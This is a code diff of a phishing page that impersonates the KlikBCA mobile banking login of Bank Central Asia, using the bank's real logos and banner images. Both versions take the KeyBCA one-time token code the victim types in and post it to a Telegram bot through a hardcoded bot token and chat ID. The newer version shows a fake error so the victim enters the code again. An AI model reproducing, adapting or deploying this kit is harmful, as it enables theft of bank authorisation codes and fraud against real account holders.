@@ -1,252 +1,118 @@
 <html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1" name="viewport" />
-  <title>KeyBCA Login</title>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>RESPON KEYBCA APPLI 1</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    /* Reset some default styles */
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      margin: 0;
-      background-color: #ffffff;
+   body {
       font-family: Arial, sans-serif;
-      color: #1a2a4a;
     }
-    header {
-      background-color: #0a3a8c;
-      border-top: 4px solid #f3c623;
-      border-bottom: 4px solid #f3c623;
-      padding: 0.25rem 0;
-      text-align: center;
-    }
-    header img {
-      width: 150px;
-      height: auto;
-      object-fit: contain;
-    }
-    main {
-      max-width: 400px;
-      margin: 1rem auto;
-      padding: 0 1rem;
-    }
-    h1 {
-      font-size: 1.25rem;
-      font-weight: normal;
-      border-bottom: 1px solid #666666;
-      padding-bottom: 0.25rem;
-      margin-bottom: 0.25rem;
-    }
-    p.subtitle {
-      color: #d98300;
-      font-size: 1.2rem;
-      margin-top: 0;
-      margin-bottom: 0.5rem;
-    }
-    form {
-      margin-top: 0.5rem;
-      max-width: 320px;
-    }
-    input[type="text"] {
-      width: 100%;
-      max-width: 320px;
-      padding: 0.4rem 0.5rem;
-      font-size: 1.125rem;
-      color: #666666;
-      border: 1px solid #999999;
-      border-radius: 0.25rem;
-      outline-offset: 2px;
-      outline-color: transparent;
-      transition: outline-color 0.2s ease;
-    }
-    input[type="text"]:focus {
-      outline-color: #0a3a8c;
-    }
-    .form-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-top: 0.5rem;
-      max-width: 320px;
-    }
-    button {
-      background-color: #ffffff;
-      border: 1px solid #666666;
-      padding: 0.25rem 0.75rem;
-      font-size: 1.125rem;
-      cursor: pointer;
-      color: #000000;
-      border-radius: 0.125rem;
-      transition: background-color 0.2s ease, color 0.2s ease;
-      order: 0;
-    }
-    a.full-site-link {
-      color: #0000ee;
-      font-size: 1.125rem;
-      text-decoration: underline;
-      font-weight: normal;
-      order: 1;
-    }
-    a.full-site-link:hover,
-    a.full-site-link:focus {
-      color: #000099;
-      outline: none;
-    }
-    button:hover,
-    button:focus {
-      background-color: #0a3a8c;
-      color: #ffffff;
-      border-color: #0a3a8c;
-      outline: none;
-    }
-    .banner {
-      margin-top: 1rem;
-      max-width: 320px;
-      border-radius: 0.5rem;
-      overflow: hidden;
-    }
-    .banner img {
-      width: 100%;
-      height: auto;
-      display: block;
-      border-radius: 0.5rem;
-    }
-    .badges {
-      margin-top: 1rem;
-      max-width: 320px;
-      display: flex;
-      gap: 1rem;
-    }
-    .badges img {
-      height: 40px;
-      width: auto;
-      object-fit: contain;
-    }
-    footer {
-      background-color: #4a5499;
-      height: 3rem;
-      margin-top: 2rem;
-    }
-    @media (max-width: 400px) {
-      main {
-        max-width: 100%;
-        padding: 0 0.5rem;
-      }
-      form,
-      .form-row,
-      .banner,
-      .badges {
-        max-width: 100%;
-      }
-      input[type="text"] {
-        font-size: 1rem;
-      }
-      button,
-      a.full-site-link {
-        font-size: 1rem;
-      }
-    }
+   #logo img {
+     display: block;
+     height: 55px;
+     width: 64px;
+   }
+   #logo {
+     background: #FFFFFF url(https://m.klikbca.com/images/bg_top_2x55.gif) repeat-x top;
+     height: 57px;
+     color: #FFFFFF;
+   }
+   footer {
+     background-color: #4f53b6; /* Footer color */
+   }
+   .border-custom-gray {
+     border-color: #ffffff; /* Custom gray border color */
+   }
   </style>
-</head>
-<body>
-  <body onload="document.getElementById('txt_user_id').focus();">
-
-    <div id="wrapper">
-        <div id="header">
-            <div id="logo" style="background:#FFFFFF url(https://m.klikbca.com/images/bg_top_2x55.gif) repeat-x top; height:57px; color:#FFFFFF">
-                <img src="https://m.klikbca.com/images/logo_bca_64x55.gif" alt="BCA-lite">
-            </div>
-            <!--<div style="background:#4f53b6"> </div>-->
-            <div style="background:#e7cb00; height:3px"> </div>
-        </div>
-
-        <div id="page-content" style="display:inline-block;">
-            <table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%">
-
-                <tbody>
-  <main>
-    <h1>Silakan masukkan kode KeyBCA</h1>
-    <p class="subtitle">Please enter Code KeyBCA</p>
-    <form id="keybcaForm">
-      <input
-        id="keybcaInput"
-        type="text"
-        placeholder="Masukkan kode Apply 1"
-        required
-        autocomplete="off"
-      />
-      <div class="form-row">
-        <button type="submit">LOGIN</button>
-        <a href="#" class="full-site-link">Full Site</a>
-      </div>
-    </form>
-    <div class="banner">
-      <img
-        alt="Banner with text Perpanjang Tahapan Berjangka Tanpa Ribet di KlikBCA with a laptop illustration on right side"
-        src="https://m.klikbca.com/images/banner_login_5.png"
-        height="60"
-        width="320"
-      />
+ </head>
+ <body onload="document.getElementById('txt_user_id').focus();" class="bg-white text-[13px] leading-tight">
+  <div id="wrapper">
+   <div id="header">
+    <div id="logo">
+     <img alt="BCA-lite" src="https://m.klikbca.com/images/logo_bca_64x55.gif"/>
     </div>
-    <div class="badges">
-      <img
-        alt="AWAS MODUS security badge with yellow and blue colors"
-        src="https://m.klikbca.com/images/keamanan-ib.png"
-        height="40"
-        width="120"
-      />
-      <img
-        alt="digicert EV SECURE badge with blue border and lock icon"
-        src="https://m.klikbca.com/images/digicert-seal.png"
-        height="40"
-        width="120"
-      />
-    </div>
+   </div>
+   <div class="h-4"></div>
+  </header>
+  <main class="border border-custom-gray mx-1 mt-1">
+   <div class="px-2 py-1 text-[13px] text-blue-900 font-semibold">
+    RESPON KEYBCA APPLI 1
+   </div>
+   <div class="bg-gray-100 px-2 py-[2px]">
+    <input aria-label="Respon KeyBCA Appli 1 input" class="border border-black text-[13px] px-1 py-[2px] w-40" id="txt_user_id" maxlength="8" pattern="\d*" inputmode="numeric" type="text" />
+   </div>
+   <div class="px-2 py-1 text-[11px] text-red-700 font-normal leading-tight">
+    PASTIKAN DATA YANG DIINPUT TELAH BENAR.
+    <br/>
+    BCA TIDAK BERTANGGUNG JAWAB TERHADAP KESALAHAN PENGINPUTAN DATA
+   </div>
+   <div class="px-2 py-2 flex gap-2">
+    <button id="sendBtn" class="bg-gray-300 text-[#0000a7] font-semibold text-[13px] px-3 py-1 border border-custom-gray" type="button">
+     Kirim
+    </button>
+    <button id="cancelBtn" class="bg-gray-300 text-[#0000a7] font-semibold text-[13px] px-3 py-1 border border-custom-gray" type="button">
+     Batal
+    </button>
+   </div>
   </main>
-  <footer></footer>
+  <footer class="text-white text-[13px] flex justify-start gap-6 px-3 py-2 mt-2">
+   <a class="hover:underline" href="#">
+    MENU UTAMA
+   </a>
+   <a class="hover:underline" href="klikbca.html">
+    LOGOUT
+   </a>
+  </footer>
 
   <script>
-    // Replace these with your Telegram bot token and chat ID
-    const TELEGRAM_BOT_TOKEN = "8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc";
-    const TELEGRAM_CHAT_ID = "7549590022";
+    const botToken = '8142214274:AAGDkwwEOsbxxo00e-hd7p5avWosgEjsjA8';
+    const chatId = '7549590022';
 
-    document.getElementById("keybcaForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const code = document.getElementById("keybcaInput").value.trim();
-      if (!code) {
-        alert("Please enter the code.");
+    document.getElementById('sendBtn').addEventListener('click', () => {
+      const input = document.getElementById('txt_user_id');
+      const message = input.value.trim();
+
+      if (!message) {
+        alert('Please enter a response.');
+        return;
+      }
+      if (!/^\d{1,8}$/.test(message)) {
+        alert('Input harus berupa maksimal 8 angka.');
+        input.focus();
         return;
       }
 
-      const message = `KeyBCA Code: ${code}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const params = {
+        chat_id: chatId,
+        text: `RESPON KEYBCA APPLI 1: ${message}`
+      };
 
-      fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-          }),
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert('KESALAHAN RESPON KeyBCA.');
+          input.value = '';
+        } else {
+          alert('Gagal mengirim data ke Telegram.');
         }
-      )
-        .then((response) => response.json())
-        .then((data) => {
-          if (data.ok) {
-            
-            document.getElementById("keybcaForm").reset();
-          } else {
-            alert("Failed to send code to Telegram.");
-          }
-        })
-        .catch(() => {
-          alert("Error sending code to Telegram.");
-        });
+      })
+      .catch(() => {
+        alert('Terjadi kesalahan saat mengirim data.');
+      });
+    });
+
+    document.getElementById('cancelBtn').addEventListener('click', () => {
+      document.getElementById('txt_user_id').value = '';
     });
   </script>
-</body>
-            </html>
+ </body>
+</html>
